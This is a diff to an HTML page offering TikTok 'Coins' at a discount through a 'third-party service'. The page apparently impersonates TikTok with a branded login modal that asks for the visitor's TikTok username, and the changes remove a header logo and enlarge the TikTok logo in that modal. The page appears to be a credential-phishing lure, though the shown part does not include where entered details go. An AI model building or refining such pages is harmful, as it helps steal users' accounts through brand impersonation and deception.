@@ -43,21 +43,6 @@ body {
   font-weight: bold;
 }
 
-.header-right {
-  display: flex;
-  justify-content: flex-end;
-  align-items: center;
-  margin-right: -160px;
-  margin-top: 20px;
-}
-
-.tiktok-mini-logo {
-  width: 230px;
-  height: auto;
-  opacity: 0.95;
-  transition: 0.3s ease;
-}
-
 .sub-text {
   font-size: 16px;
   color: #333;
@@ -303,9 +288,6 @@ body {
 <div class="container">
   <div class="header">
     <h1>Get Coins</h1>
-    <div class="header-right">
-      <img class="tiktok-mini-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-    </div>
   </div>
 
   <p class="sub-text">Save around <span>25%</span> with a lower<br>third-party service fee.</p>
@@ -366,12 +348,12 @@ body {
   <div class="loader"></div>
 </div>
 
-<!-- ✅ TikTok-style login modal with disabled Continue until filled -->
+<!-- ✅ Login modal with larger TikTok logo -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
     <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
          alt="TikTok Logo"
-         style="width: 60px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
+         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
     <h2 style="margin-top: 20px;">Log in to get Coins</h2>
     <p>Log in to your TikTok account to get Coins, check notifications and more.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
